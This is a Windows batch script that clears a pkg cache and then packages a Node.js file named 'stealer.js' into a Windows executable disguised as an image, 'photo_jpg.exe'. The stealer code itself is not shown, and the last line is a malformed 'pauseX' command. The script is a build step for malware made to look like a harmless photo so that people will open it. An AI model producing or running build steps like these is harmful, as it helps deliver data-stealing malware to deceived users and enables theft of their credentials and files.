@echo off
echo Cleaning pkg cache...
rmdir /s /q "%LOCALAPPDATA%\pkg-cache"

echo Building...
pkg stealer.js --targets node18-win-x64 --no-bytecode --public --output photo_jpg.exe

pauseX
